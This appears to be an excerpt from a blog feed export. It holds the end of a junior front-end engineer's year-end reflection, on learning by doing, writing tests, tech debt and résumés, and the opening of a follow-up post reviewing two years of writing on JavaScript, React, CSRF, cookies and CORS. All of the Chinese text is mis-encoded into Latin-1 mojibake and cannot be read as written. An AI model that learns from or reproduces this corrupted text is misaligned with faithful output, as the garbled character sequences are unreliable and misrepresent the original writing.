é‚£äº›æŠ€è¡“æ–‡ç« å¦‚æœæ¯å¤©çœ‹æ¯å¤©çœ‹ï¼Œæœƒæœ‰ä¸€ç¨®ã€Œæˆ‘å¥½åƒå­¸åˆ°å¾ˆå¤šã€çš„éŒ¯è¦ºã€‚ä½†éä¸€å€‹æœˆä»¥å¾Œå†å•ä½ ç•¶åˆçœ‹çš„é‚£ç¯‡æ–‡ç« åœ¨è¬›ä»€éº¼ï¼Œä½ é‚„è¨˜å¾—å—ï¼Ÿåƒæˆ‘çš„è©±å…«æˆæ˜¯å¿˜è¨˜äº†ï¼Œåªå¤§æ¦‚è¨˜å¾—æ–‡ç« çš„æ¨™é¡Œè·Ÿä¸€é»é»å…§å®¹è€Œå·²ã€‚
è¦ºå¾—çœ‹å¾ˆå¤šç¯‡æŠ€è¡“æ–‡ç« å°±èƒ½å­¸åˆ°å¾ˆå¤šæŠ€è¡“çš„é€™ç¨®æƒ³æ³•ï¼Œæˆ‘çœŸçš„å¤ªå¤©çœŸäº†ã€‚å¯¦éš›ä¸Šä½ æŠŠæ•´ç¯‡æ–‡ç« çœ‹å®Œï¼Œå­¸åˆ°çš„å¯èƒ½åªæ˜¯ä½œè€…ç†è§£çš„ 30% æˆ–è€…æ˜¯æ›´å°‘è€Œå·²ã€‚ç‚ºä»€éº¼ï¼Ÿå› ç‚ºä½ åªæ˜¯çœ‹ï¼Œä½ æ²’æœ‰å‹•æ‰‹åšï¼Œä½ ä¹Ÿæ²’æœ‰å¯¦éš›ç¢°éé‚£å€‹å•é¡Œã€‚æ‰€ä»¥é‚£ç¯‡æ–‡ç« å°ä½ ä¾†èªªï¼Œå°±åªæ˜¯çœ‹è‘—çœ‹è‘—å°±å¿˜è¨˜äº†ã€‚
æˆ‘è¦ºå¾—åœ¨æŠ€è¡“çš„å­¸ç¿’ä¸Šï¼Œã€Œç—›ã€æ˜¯ä¸€ä»¶å¾ˆé‡è¦çš„äº‹ã€‚ä½ è¦ç—›éï¼Œæ‰èƒ½ç™¼è‡ªå…§å¿ƒçš„æƒ³è¦è§£æ±ºé‚£å€‹å•é¡Œï¼Œè§£æ±ºä»¥å¾Œä¹Ÿæ‰èƒ½çœŸæ­£çš„ç†è§£é€™å€‹å•é¡Œã€‚
æ¯”å¦‚èªªä»Šå¤©ä½ çœ‹äº†ä¸€ç¯‡æ–‡ç« åœ¨è¬›å¤§å‹æ¶ç¥¨ç³»çµ±çš„ä¼ºæœå™¨æ¶æ§‹èˆ‡å»ºç½®ã€‚ä½ å¯èƒ½çœ‹å®Œä¹‹å¾Œå­¸åˆ°ï¼šå—¯ï¼Œæœ‰é€™ä¸€ç¨®å»ºç½®çš„æ–¹æ³•ï¼Œä¸‹æ¬¡å¯ä»¥ä¾†è©¦è©¦çœ‹ã€‚ä½ å°±åªå­¸åˆ°é€™å€‹ã€Œçµè«–ã€è€Œå·²ã€‚
å¯æ˜¯ po é‚£ç¯‡æ–‡ç« çš„ä½œè€…ï¼Œä»–å­¸åˆ°çš„æ˜¯ã€Œä¸€é–‹å§‹çš„æ¶ç¥¨æ¶æ§‹æœ‰ä»€éº¼å•é¡Œã€ã€ã€Œæ”¹è‰¯å¾Œçš„æ¶æ§‹è§£æ±ºå“ªäº›å•é¡Œã€ã€ã€Œå…©è€…ä¹‹é–“çš„å„ªåŠ£åˆ†åˆ¥æ˜¯å“ªäº›ï¼Œé©åˆä»€éº¼ä½¿ç”¨å ´æ™¯ã€ã€‚å› ç‚ºæ¶ç¥¨ç³»çµ±çš„æ•´å€‹å„ªåŒ–éç¨‹ä»–éƒ½æœ‰åƒèˆ‡ï¼Œæ‰€ä»¥ä»–çµ•å°å°é€™äº›å•é¡Œåˆ»éª¨éŠ˜å¿ƒï¼Œå¯ä»¥è¬›å€‹å…©ä¸‰å€‹å°æ™‚ã€‚
æˆ‘è¦ºå¾—çœ‹ä¸€ç¯‡æŠ€è¡“æ–‡ç« ä½ å­¸åˆ°çš„å¯èƒ½åªæ˜¯è¡¨é¢ï¼Œåªæ˜¯åˆ¥äººæœ€å¾Œç”¢å‡ºä¾†çš„çµè«–ã€‚ä½ è¦çœŸæ­£ç†è§£çš„è©±ï¼Œå¿…é ˆè¦è‡ªå·±è·³ä¸‹å»å‹•æ‰‹åšï¼Œå¯¦éš›å»ç—›ã€æ‰èƒ½é ˜æ‚Ÿç‚ºä»€éº¼è¦é€™æ¨£å­åšã€‚
ä»¥æˆ‘è‡ªå·±ç‚ºä¾‹å­ï¼Œæˆ‘å‰›é–‹å§‹çš„æ™‚å€™è·Ÿå¾ˆå¤šäººä¸€æ¨£ï¼Œä¸å–œæ­¡å¯«æ¸¬è©¦ã€‚æˆ‘è¦ºå¾—è‡ªå·±æ‰‹å‹•æ¸¬ä¸€æ¸¬å°±å¥½ï¼Œå¹¹å˜›èŠ±æ™‚é–“å»å¯«æ¸¬è©¦ï¼Ÿä½†ç›´åˆ°æˆ‘ã€Œç—›éã€ä¹‹å¾Œï¼Œæˆ‘æ”¹è§€äº†ã€‚å› ç‚ºæœ‰æ™‚å€™æ‰‹å‹•æ¸¬çš„æµç¨‹å¾ˆç¹ç‘£ï¼Œä½ å¯èƒ½è¦æ‰“é–‹é é¢ã€ç™»å…¥ã€ç­‰å€‹å¹¾ç§’æŒ‰æŒ‰éˆ•ä¹‹é¡çš„ï¼Œæ¯æ”¹ä¸€æ¬¡ code å°±å¿…é ˆè¦æ‰‹å‹•æ¸¬è©¦ä¸€éã€‚é€™å€‹éç¨‹èŠ±äº†æˆ‘å¾ˆå¤šæ™‚é–“ï¼Œæ‰€ä»¥æœ€å¾Œæˆ‘å°±æ±ºå®šå¯«æ¸¬è©¦äº†ã€‚
æˆ–è€…æ˜¯ä½ æ¯æ¬¡éƒ½é æ‰‹å‹•æ¸¬è©¦ï¼Œä½†æœ‰ä¸€æ¬¡æŸå€‹æµç¨‹å¿˜è¨˜æ¸¬åˆ°ï¼ˆå› ç‚ºä½ æƒ³èªªç¨‹å¼ç¢¼æ²’æœ‰æ”¹åˆ°é‚£é‚Šï¼‰ï¼Œç„¶å¾Œæ™šä¸ŠåäºŒé»æ¥åˆ° PM é›»è©±èªªç¶²ç«™æœ‰åš´é‡çš„ bugï¼Œåªå¥½åŠå¤œåŠ ç­å»å…¬å¸ä¿® bugï¼Œæ‰ç™¼ç¾æ˜¯è‡ªå·±å¿˜è¨˜å…¶å¯¦æ”¹å‹•çš„åœ°æ–¹è·Ÿå‡ºå•é¡Œçš„åœ°æ–¹æ˜¯æœ‰é€£å‹•çš„ï¼Œæ‰€ä»¥æ‰æœƒå‡ºç¾é€™ç¨® bugã€‚æœ‰äº†é€™æ¬¡ç¶“é©—ä¹‹å¾Œï¼Œç‚ºäº†ä¸è¦å†åŠå¤œåˆ°å…¬å¸åŠ ç­ï¼Œç›¸ä¿¡ä½ æœƒå¾ˆé¡˜æ„å¯«æ¸¬è©¦çš„ã€‚
æˆ‘è¦ºå¾—å¾ˆå¤šå·¥å…·éƒ½æ˜¯é€™æ¨£ï¼Œä½ ç”¨å®ƒä¸€å®šæ˜¯æœ‰ç†ç”±çš„ï¼Œæ˜¯å› ç‚ºå®ƒæœ‰æ‰“åˆ°ä½ çš„ç—›é»ï¼Œè€Œä¸”è¦å¤ ç—›ï¼Œä½ æ‰æœƒé¡˜æ„å»ç”¨ã€‚
åˆ©ç”¨å†—é¤˜æ™‚é–“å‡å¦‚ä½ è² è²¬çš„å°ˆæ¡ˆçš„éœ€æ±‚å·²ç¶“é–‹ç™¼çš„å·®ä¸å¤šäº†ï¼Œæ–¼æ˜¯ä½ æ‰‹é‚Šæ²’æœ‰å…¶ä»–äº‹æƒ…å¯ä»¥åšï¼Œå‘ˆç¾ä¸€å€‹å¾ˆæ‚ é–’çš„ç‹€æ…‹ï¼Œä½ æœƒåšä»€éº¼ï¼Ÿ

æ»‘æ‰‹æ©Ÿ
é€› facebook, ptt
å„ªåŒ–ç¨‹å¼ç¢¼

é€šå¸¸æœƒé¸ 1 æˆ–è€…æ˜¯ 2ï¼ˆæˆ‘è‡ªå·±ä¹Ÿæ˜¯ï¼‰ï¼Œä½†æˆ‘æœ€è¿‘é¸äº† 3ã€‚æˆ‘æœƒè¶è‘—æ²’æœ‰äº‹æƒ…åšçš„æ™‚å€™è¶•å¿«çœ‹ä¸€ä¸‹è‡ªå·±çš„ç¨‹å¼ç¢¼æœ‰å“ªé‚Šå¯ä»¥æ”¹é€²çš„ï¼Œå¯ä»¥æŠ½å‡ºä¾†çš„éƒ¨åˆ†å°±æŠ½å‡ºä¾†ï¼Œä¸¦ä¸”è‡ªç™¼æ€§åœ°å¹«æˆ‘çš„ç¨‹å¼åŠ ä¸Š eslint èªæ³•æª¢æŸ¥ä»¥åŠä¸€äº›ç°¡å–®çš„ testã€‚
ä»¥å‰ç´¯ç©ä¸‹ä¾†çš„æŠ€è¡“å‚µï¼Œç¸½æœ‰ä¸€å¤©è¦é‚„çš„ï¼Œä¸ç„¶å°±åªæ˜¯è¶Šç©è¶Šå¤šï¼Œç„¶å¾Œè¶Šé›£ç¶­è­·è€Œå·²ã€‚æˆ‘è¦ºå¾—æ‡‰è©²å¥½å¥½åˆ©ç”¨é€™äº›é›£å¾—çš„æ™‚é–“ä¾†å°è‡ªå·±è² è²¬çš„ç¨‹å¼åšä¸€äº›æ”¹é€²ï¼Œä¸ç„¶ç­‰åˆ°ä¸‹æ¬¡å†æœ‰é€™ç¨®æ™‚æ©Ÿï¼Œå¯èƒ½å‚µå·²ç¶“å¾ˆé›£é‚„äº†ã€‚
ç¶­è­·å±¥æ­·æˆ‘è¦ºå¾—å®šæœŸç¶­è­·è‡ªå·±çš„å±¥æ­·ä¹Ÿæ˜¯å¾ˆé‡è¦çš„ä¸€ä»¶äº‹ã€‚ä¸€æ–¹é¢æ˜¯å¯ä»¥æ¸›è¼•è‡ªå·±çš„è² æ“”ï¼Œä¸è¦æ¯æ¬¡è¦æ±‚è·çš„æ™‚å€™æ‰èŠ±å¾ˆå¤šæ™‚é–“æ”¹ï¼Œå¯ä»¥åœ¨å¹³å¸¸å°±æ…¢æ…¢ç´¯ç©æ…¢æ…¢æ”¹ã€‚å¦ä¸€æ–¹é¢ä¹Ÿæ˜¯è—‰ç”±å®šæœŸç¶­è­·å±¥æ­·ï¼Œå¯ä»¥æª¢è¦–è‡ªå·±éå»é€™æ®µæ™‚é–“åšäº†å“ªäº›äº‹æƒ…ã€å®Œæˆäº†å“ªäº›å°ˆæ¡ˆã€‚
åœ¨é€™é‚Šå»ºè­°å¤§å®¶åœ¨ Linkedin ä¸Šé¢å®šæœŸç¶­è­·è‡ªå·±çš„è‹±æ–‡å±¥æ­·ï¼Œå¦‚æœä¸çŸ¥é“è©²æ€éº¼å¯«çš„ï¼Œæˆ‘æä¾›ä¸€å€‹æˆ‘å€‹äººå¯¦éš›è©¦ç”¨éï¼Œéå¸¸æœ‰æ•ˆçš„çµ•æ‹›ï¼šåƒè€ƒå¼·è€…ä½ æœ‹å‹çš„ã€‚é€™ä¸€æ‹›çœŸçš„å¾ˆæœ‰æ•ˆï¼Œåƒè€ƒé‚£äº›å¼·è€…æœ‹å‹çš„å±¥æ­·ï¼Œä½ è‡ªå·±å¤§æ¦‚å°±æœƒçŸ¥é“å¯ä»¥æ€éº¼å¯«äº†ã€‚
åƒæ˜¯æˆ‘çš„ Linkedinå°±åƒè€ƒä¸€äº›æˆ‘æœ‹å‹çš„ï¼ŒæŠŠä¸€äº›æˆ‘è¦ºå¾—æˆ‘ä¹Ÿæœƒçš„æŠ€èƒ½ä¹ŸæŠ„ä¸‹ä¾†ï¼Œç„¶å¾ŒæŠŠçœ‹èµ·ä¾†è¦ºå¾—ä¸éŒ¯çš„æ ¼å¼ä¹Ÿå­¸èµ·ä¾†ï¼Œæœ€å¾Œæ‹¼æ‹¼æ¹Šæ¹Šå°±å®Œæˆäº†è‡ªå·±çš„ç¬¬ä¸€ä»½è‹±æ–‡å±¥æ­·ã€‚è€Œä¸”å®Œæˆä¹‹å¾Œï¼Œé‚„çœŸçš„æœ‰çµäººé ­çš„å¯„ä¿¡ä¾†é‚€ç´„ï¼Œå¯è¦‹è‹±æ–‡å±¥æ­·é‚„æ˜¯å¾ˆæœ‰ç”¨çš„ã€‚
çµè«–å°±å¦‚åŒæ¨™é¡Œä¸€æ¨£ï¼Œæˆ‘æ˜¯å€‹è³‡æ·ºå·¥ç¨‹å¸«ï¼Œæ‰€ä»¥è¨±å¤šæƒ³æ³•å…¶å¯¦é‚„å¾ˆä¸æˆç†Ÿï¼Œå¾ˆå¤šçš„åƒ¹å€¼è§€éƒ½é‚„æ²’æœ‰ç¢ºç«‹ï¼Œçœ‹çš„ä¹Ÿä¸å¤ å¤šã€‚po é€™ç¯‡æ–‡å°±åªæ˜¯å¸Œæœ›èƒ½å¤ åœ¨å¹´å°¾å¹«è‡ªå·±åšå€‹å›é¡§ï¼ŒæŠŠåˆ°ç¾éšæ®µç‚ºæ­¢çš„å¿ƒå¾—æ„Ÿæƒ³è·Ÿå¤§å®¶åˆ†äº«ã€‚æˆ–è¨±ä»¥å¾Œæˆ‘çš„æƒ³æ³•æœƒæ”¹è®Šï¼Œé€™å€‹å¾ˆæ­£å¸¸ï¼Œé‚£æ™‚çš„æƒ³æ³•å¯èƒ½æœƒæ¯”ç¾åœ¨æˆç†Ÿè¨±å¤šã€‚åˆ°é‚£å€‹æ™‚å€™ï¼Œå°±å¯ä»¥è‡ªå·±ä¾†å›è¦†é€™ä¸€ç¯‡æ–‡ç« ï¼Œä¾†å¹«è‡ªå·±è§£æƒ‘äº†ã€‚
æœ€å¾Œï¼Œç¥å¤§å®¶æ–°å¹´å¿«æ¨‚ï¼
é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>Software Engineer</tag>
      </tags>
  </entry>
  <entry>
    <title>å…©å¹´éå¾Œï¼Œæˆ‘èƒ½å¤ è¢«ç¨±ç‚ºè³‡æ·±å·¥ç¨‹å¸«äº†å—ï¼Ÿ</title>
    <url>/2018/12/29/review-2018/</url>
    <content><![CDATA[å‰è¨€åœ¨å…©å¹´å‰æˆ‘å¯«äº†é€™ç¯‡ä¸€å€‹è³‡æ·ºå·¥ç¨‹å¸«å¹´æœ«çš„è‡ªæˆ‘çœè¦–ï¼Œå…§æ–‡ä¸»è¦æ˜¯æª¢è¦–è‡ªå·±é‚£å¹´å­¸åˆ°çš„æ±è¥¿ä»¥åŠæŠ’ç™¼å¿ƒå¾—æ„Ÿæƒ³ï¼Œä¸¦æå‡ºä¸€äº›å°æ–¼è‡ªå·±è·æ¶¯ç™¼å±•ä¸Šçš„ç–‘å•ã€‚
æ¨™é¡Œä¹‹æ‰€ä»¥æ˜¯æ‰“ã€Œè³‡æ·ºã€å·¥ç¨‹å¸«ï¼Œæ˜¯å› ç‚ºé‚£æ™‚è¦ºå¾—é€£è³‡æ·±çš„é‚Šéƒ½æ²¾ä¸ä¸Šï¼Œæ‰€ä»¥ç”¨äº†è³‡æ·ºé€™å€‹å­—ä¾†å½¢å®¹è‡ªå·±ã€‚
å…©å¹´éå»äº†ï¼Œè·ç¨±å¾å·¥ç¨‹å¸«è®Šæˆè³‡æ·±å·¥ç¨‹å¸«ï¼Œç”šè‡³é‚„å†å¾€ä¸Šè®Šæˆäº† Front-end Team Leadã€‚é›–ç„¶è·ç¨±æœ¬ä¾†å°±ä¸ä»£è¡¨ä¸€åˆ‡ï¼Œä½†æˆ‘èªç‚ºå®ƒè‡³å°‘ã€Œä»£è¡¨è‘—ä»€éº¼ã€ï¼Œä½ åˆ°äº†é‚£å€‹ä½å­å°±å¿…é ˆè² èµ·è²¬ä»»ï¼Œå¦‚æœè¦ºå¾—è‡ªå·±èƒ½åŠ›æœªåŠï¼Œå°±å¿…é ˆç›¡åŠ›å»è¿½è¶•ï¼Œç›´åˆ°è‡ªå·±èƒ½æ“”èµ·é‚£å€‹è²¬ä»»ç‚ºæ­¢ã€‚
é€™ç¯‡æœƒå…ˆå›é¡§æˆ‘é€™å…©å¹´ä¾†çš„ç™¼å±•ï¼Œæœ€å¾Œå†åˆ†äº«ä¸€äº›è‡ªå·±çš„å¿ƒå¾—æ„Ÿæƒ³ã€‚
åœ¨é€™ä¹‹å‰ä¸€æ¨£å…ˆé ç¥å„ä½è®€è€…æ–°å¹´å¿«æ¨‚ï¼
æŠ€è¡“çš„æ·±åº¦å…©å¹´å‰æˆ‘åœ¨æ–‡ä¸­æåˆ°è‡ªå·±æ˜¯ä¸€å€‹æœ‰å»£åº¦æ²’æ·±åº¦çš„äººï¼Œå¸Œæœ›è‡ªå·±ä¹‹å¾Œèƒ½èµ°å¾—æ›´æ·±ä¸€é»ï¼ŒæŠŠåŸºç¤æ‰“çš„æ›´ç´®å¯¦ã€‚è€Œé€™å…©å¹´ä¹‹é–“çš„ç¢ºæœ‰æœé€™å€‹æ–¹å‘é‚é€²ï¼Œé–‹å§‹ç™¼ä¸€äº›æ¯”è¼ƒæœ‰æ·±åº¦çš„æŠ€è¡“æ–‡ç« ï¼Œé€™äº›æ–‡ç« çš„éˆæ„Ÿå¸¸å¸¸ä¾†è‡ªæ–¼å·¥ä½œã€‚
åƒæ˜¯åœ¨å·¥ä½œæ™‚è¢«è³‡å®‰éƒ¨é–€è­¦å‘Šæœ‰ CSRF æ¼æ´ï¼Œæ–¼æ˜¯èŠ±äº†é»æ™‚é–“ç ”ç©¶ï¼Œä¸¦å¯«ä¸‹äº†è®“æˆ‘å€‘ä¾†è«‡è«‡ CSRFï¼Œä¹Ÿåœ¨å·®ä¸å¤šçš„æ™‚é–“é»ç™¼ç¾ä»¤æˆ‘ååˆ†ä¸è§£çš„ Cookie å•é¡Œï¼Œèª¤æ‰“èª¤æ’è§£é–‹å¾Œæ·±å…¥ç ”ç©¶ï¼Œç†è§£å•é¡Œä»¥å¾Œå¯«äº†æˆ‘é‡éçš„æœ€é›£çš„ Cookie å•é¡Œã€‚ä¸åŒçš„å·¥ä½œå…§å®¹ä¹Ÿæœƒç¢°åˆ°ä¸åŒçš„å•é¡Œï¼Œä¾‹å¦‚èªªåœ¨åš PWA æ™‚ç¢°åˆ°çš„åŸä¾† CORS æ²’æœ‰æˆ‘æƒ³åƒä¸­çš„ç°¡å–®ä»¥åŠå®Œæˆ PWA å¾Œçš„PWA å¯¦æˆ°ç¶“é©—åˆ†äº«ã€‚
é™¤äº†å·¥ä½œä¸Šå¾—åˆ°çš„éˆæ„Ÿï¼Œè‡ªå·±æ·±æ·±è¦ºå¾—å° JavaScript çš„åŸºç¤æŒæ¡ä¸è¶³ï¼Œé‚£äº›å¸¸è¦‹çš„é¢è©¦é¡Œæˆ‘å¾ä¾†æ²’æœ‰ææ‡‚éç‚ºä»€éº¼ã€‚å„˜ç®¡é€™äº›åœ¨å·¥ä½œä¸Šä¸ä¸€å®šç”¨å¾—åˆ°ï¼Œä½†å¦‚æœæˆ‘æƒ³æˆç‚ºè³‡æ·±å·¥ç¨‹å¸«ï¼Œæˆ‘èªç‚ºé‚£æ˜¯é€ƒä¸æ‰çš„ï¼Œæ˜¯ä¸€å®šè¦ç†è§£çš„æ±è¥¿ã€‚
é‡å°é€™å€‹éƒ¨åˆ†ï¼Œæˆ‘å¯«çš„ç¬¬ä¸€ç¯‡æ–‡ç« æ˜¯è©²ä¾†ç†è§£ JavaScript çš„åŸå‹éŠäº†ä¸¦ä¸”å¾—åˆ°æ»¿å¤šå¥½è©•ï¼Œå†ä¾†å¯«äº†æ·±å…¥æ¢è¨ JavaScript ä¸­çš„åƒæ•¸å‚³éï¼šcall by value é‚„æ˜¯ referenceï¼Ÿï¼ŒæŠŠè‡ªå·±å°é€™å€‹è­°é¡Œçš„æ„è¦‹åšäº†å€‹æ•´ç†ï¼Œç„¶å¾Œæ˜¯è¿‘æœŸçš„æˆ‘çŸ¥é“ä½ æ‡‚ hoistingï¼Œå¯æ˜¯ä½ äº†è§£åˆ°å¤šæ·±ï¼Ÿèˆ‡æ‰€æœ‰çš„å‡½å¼éƒ½æ˜¯é–‰åŒ…ï¼šè«‡ JS ä¸­çš„ä½œç”¨åŸŸèˆ‡ Closureï¼ŒæŠŠçŸ¥åçš„ hoisting èˆ‡ closure éƒ½æ·±å…¥ç ”ç©¶äº†ä¸€éã€‚é€™æ¨£çœ‹ä¸‹ä¾†ï¼Œå¤§æ¦‚å†æŠŠ this å¯«å®Œï¼ˆæˆ‘ä¹Ÿæœ‰é€™å€‹è¨ˆç•«è¦å¯«ï¼‰å°±èƒ½æŠŠ JavaScript é‚£äº›æ¯”è¼ƒå¸¸è¦‹çš„åŸºç¤çµ¦æå®šäº†ï¼Œå†ä¾†å¯èƒ½å°±æ˜¯å‹åˆ¥è½‰æ›çš„ä¸€äº›å•é¡Œã€‚
é™¤äº† JavaScript ä»¥å¤–ï¼Œä¹Ÿå¯«äº†å¹¾ç¯‡æ–‡ç« æ˜¯é—œæ–¼ç¶²è·¯è·Ÿç€è¦½å™¨çš„ï¼Œåƒæ˜¯çµ¦æ–°æ‰‹çœ‹çš„è¼•é¬†ç†è§£ Ajax èˆ‡è·¨ä¾†æºè«‹æ±‚ã€æˆ‘ä»¥å‰ä¸€ç›´è¢«ææ··æœ€å¾Œçµ‚æ–¼å¼„æ‡‚çš„å¾ªåºæ¼¸é€²ç†è§£ HTTP Cache æ©Ÿåˆ¶ä»¥åŠDOM çš„äº‹ä»¶å‚³éæ©Ÿåˆ¶ï¼šæ•ç²èˆ‡å†’æ³¡ï¼Œæˆ–å¶çˆ¾ç ”ç©¶ä¸€ä¸‹æ¯”è¼ƒæ–°çš„æ±è¥¿åƒçµ±ä¸€ç¶²é æ”¯ä»˜ä»‹é¢ï¼šPayment Request APIã€‚
å¾ 2015 å¹´é–‹å§‹ï¼Œæˆ‘çš„å‰ç«¯é–‹ç™¼ç”Ÿæ¶¯å°±ä¸€ç›´åœç¹è‘— React æ‰“è½‰ï¼Œæ‰€ä»¥æœ‰æ™‚å€™ä¹Ÿæœƒå¯«ä¸€äº›ç›¸é—œçš„ä¸»é¡Œåƒæ˜¯React æ€§èƒ½å„ªåŒ–å¤§æŒ‘æˆ°ï¼šä¸€æ¬¡ç†è§£ Immutable data è·Ÿ shouldComponentUpdateèˆ‡æ·ºè«‡ React Fiber åŠå…¶å° lifecycles é€ æˆçš„å½±éŸ¿ï¼Œæˆ–æ˜¯ç‚ºäº†è¦ç”¨ redux-observable è€Œå»å­¸ RxJS æœ€å¾Œå¯«ä¸‹çš„å¸Œæœ›æ˜¯æœ€æ·ºé¡¯æ˜“æ‡‚çš„ RxJS æ•™å­¸ã€‚
å…©å¹´ä¹‹é–“å¯«äº†äºŒåå¹¾ç¯‡æ–‡ç« ï¼Œè¦ç‰¹åˆ¥æ„Ÿè¬ TechBridge çš„å¤¥ä¼´å€‘æå‡ºä¸€èµ·ç¶“ç‡Ÿå…±ç­†éƒ¨è½æ ¼é€™å€‹ ideaï¼Œå¼·è¿«è‡ªå·±ä¸€å€‹æœˆä¸€å®šè¦å¯«å‡ºä¸€ç¯‡æ–‡ç« ä¾†ã€‚
å³ä½¿å¯«äº†é€™éº¼å¤šï¼Œæˆ‘çŸ¥é“é‚„æ˜¯æœ‰å¾ˆå¤šä¸»é¡Œæ²’æœ‰æ¶µè“‹åˆ°ï¼Œå°±ç®—æ˜¯å¯«éçš„ä¸»é¡Œä¹Ÿä¸ä¸€å®šå·²ç¶“å®Œå…¨ç†è§£ï¼Œæˆ‘è¦ºå¾—é€™æ˜¯å¯«ä½œçš„äººè¦å¾ˆå°å¿ƒçš„ä¸€å€‹éƒ¨åˆ†ï¼ˆæˆ–ä¹Ÿå¯ä»¥èªªæ˜¯æˆ‘å°è‡ªå·±çš„æé†’ï¼‰ï¼Œå¦å‰‡ä¸€ä¸å°å¿ƒå°±æœƒè®Šå¾—è‡ªå¤§äº†èµ·ä¾†ï¼Œå»æ²’æ„è­˜åˆ°é€™å€‹ä¸–ç•Œæ¯”ä½ æƒ³åƒä¸­å¤§çš„å¤šã€‚
åƒæ˜¯æˆ‘å‰å¹¾å¤©çœ‹åˆ°é€™ç¯‡æ–‡ç« ï¼šé¨°è¨Šå‰ç«¯é¢è©¦ç¯‡ï¼ˆä¸€ï¼‰åˆ†äº«è‡ªå·±å»é¨°è¨Šé¢è©¦çš„å¿ƒå¾—ï¼Œè£¡é¢å•åˆ°çš„æœ‰äº›é¡Œç›®å…¶å¯¦æˆ‘å°±ä¸æœƒï¼Œæ‰€ä»¥è¦å­¸çš„é‚„å¤šè‘—å‘¢ã€‚
é™¤äº†ä¸èƒ½è‡ªå¤§ä»¥å¤–ï¼Œä¹Ÿè¦å°å¿ƒä¸èƒ½å¦„è‡ªè²è–„ï¼Œä½†é€™è¶…ç´šé›£ï¼Œæœ‰æ™‚å€™é€™å€‹é»å¾ˆé›£æŠ“ï¼Œè¦æ…¢æ…¢å»æ‰¾åˆ°é‚£å€‹ç•Œç·šã€‚æˆ‘ä¸æœƒèªªè‡ªå·±å°æŸå€‹ä¸»é¡Œç†è§£åˆ°ç™¾åˆ†ä¹‹ç™¾ï¼Œä½†ä¹Ÿä¸æœƒèªªè‡ªå·±å®Œå…¨ä¸ç†è§£ï¼Œç•¢ç«Ÿå¯«äº†é€™éº¼å¤šä¸»é¡Œï¼Œå°å¯«éçš„æ±è¥¿é‚„æ˜¯æœ‰ä¸€å®šç¨‹åº¦çš„ç†è§£ï¼Œé€™é»è‡ªä¿¡é‚„æ˜¯è¦æœ‰çš„ã€‚
è©±èªªé‚„æœ‰ä¸€å€‹è¦å°å¿ƒçš„é™·é˜±ï¼Œé‚£å°±æ˜¯å…¶å¯¦å¾ˆå¤šäººéƒ½æœƒé€™äº›æŠ€è¡“ï¼Œåªæ˜¯æ²’æœ‰ po æ–‡æ²’æœ‰åˆ†äº«è€Œå·²ã€‚æˆ‘ä»¥å‰æ›¾ç¶“èªç‚ºæœ‰äº›æ±è¥¿æ‰¾ä¸å¤ªåˆ°æ–‡ç« æ˜¯ä¸æ˜¯æ²’ä»€éº¼äººæœƒï¼Œä¸æ˜¯ï¼Œä»–å€‘åªæ˜¯æ²’æœ‰åˆ†äº«å‡ºä¾†è€Œå·²ï¼Œé‚„æ˜¯æœ‰å¾ˆå¤šäººæœƒçš„ã€‚
æŠ€è¡“çš„å»£åº¦å…©å¹´å‰æˆ‘è¦ºå¾—è‡ªå·±å»£åº¦æ¯”æ·±åº¦å¤šå¾ˆå¤šï¼Œå› æ­¤æˆ‘å¯«äº†ä¸€å¤§å †æ–‡ç« é‡å°ä¸åŒçš„ä¸»é¡Œæ·±å…¥ç ”ç©¶ï¼Œè®“è‡ªå·±å°æŠ€è¡“çš„ç†è§£è®Šå¾—æ›´æ·±ã€‚
é‚£å»£åº¦å‘¢ï¼Ÿæœ‰äº†æ·±åº¦ä»¥å¾Œï¼Œæˆ‘å°å»£åº¦ä¾¿ä¸æ˜¯é€™éº¼åœ¨ä¹äº†ã€‚æˆ‘åœ¨ç¬¬ä¸€ä»½å·¥ä½œæ™‚é‚„æ²’æ±ºå®šå¥½è‡ªå·±æƒ³å¾€å“ªè£¡èµ°ï¼Œå› æ­¤æˆ‘ç”¨ node.js å¯«å¾Œç«¯ï¼Œç”¨ react+redux å¯«å‰ç«¯ï¼Œé‚„ç”¨ Java å¯«äº† Android çš„ Appã€‚
å¯æ˜¯åœ¨é‚£ä¹‹å¾Œæˆ‘è®Šæˆäº†å°ˆè·çš„å‰ç«¯å·¥ç¨‹å¸«ï¼Œå› æ­¤å°å¾Œç«¯æŠ€è¡“ä¾¿ä¸æ˜¯é‚£éº¼é—œæ³¨ï¼Œæœ‰å“ªäº›æ–°çš„æ½®æµæˆ‘éƒ½ä¸çŸ¥é“ï¼Œæ›´ä¸ç”¨èªª mobile äº†ã€‚é‚„æ˜¯æœƒç¶­æŒä¸€äº›åŸºæœ¬çš„æ•æ„Ÿåº¦ï¼Œä¾‹å¦‚èªªçŸ¥é“æ–°å‡ºçš„ Flutter ä¹‹é¡çš„ï¼Œä½†ä¹Ÿåƒ…åƒ…çŸ¥é“é€™å€‹é—œéµå­—è€Œå·²ã€‚
é€™å…¶å¯¦ä¹Ÿæ˜¯æˆ‘æƒ³èµ°çš„æ–¹å‘ï¼Œæˆ‘è¦ºå¾—å…ˆå»£å†æ·±å…¶å¯¦æ˜¯å¾ˆä¸éŒ¯çš„ä¸€ä»¶äº‹ï¼Œä½ å¾—å…ˆå»£æ‰èƒ½å»æ‰¾åˆ°è‡ªå·±æƒ³èµ°çš„æ–¹å‘ï¼Œä¸¦ä¸”ä¹Ÿåœ¨é€™æ®µæ™‚æœŸç´¯ç©ä¸€äº›å°å…¶ä»–é ˜åŸŸçš„åŸºæœ¬ç†è§£ï¼Œæ¥è‘—æ‰èµ°æ·±ï¼Œå»æ·±å…¥ç†è§£ä½ é¸çš„é‚£å€‹é ˜åŸŸã€‚
ä»¥æˆ‘ä¾†èªªï¼Œæˆ‘åœ¨å»£åº¦æ™‚æœŸè®“è‡ªå·±ç†è§£å¾Œç«¯ã€Mobile é–‹ç™¼æˆ–æ˜¯ä¸€é»æ¶æ§‹å±¤é¢çš„æ±è¥¿ï¼Œé€™äº›éƒ½å°æˆ‘ä¹‹å¾Œçš„è·æ¶¯å¾ˆæœ‰å¹«åŠ©ï¼Œè‡³å°‘æˆ‘æœ‰åŸºæœ¬çš„æ¦‚å¿µï¼Œä¸æœƒä»€éº¼éƒ½ä¸æ‡‚ã€‚
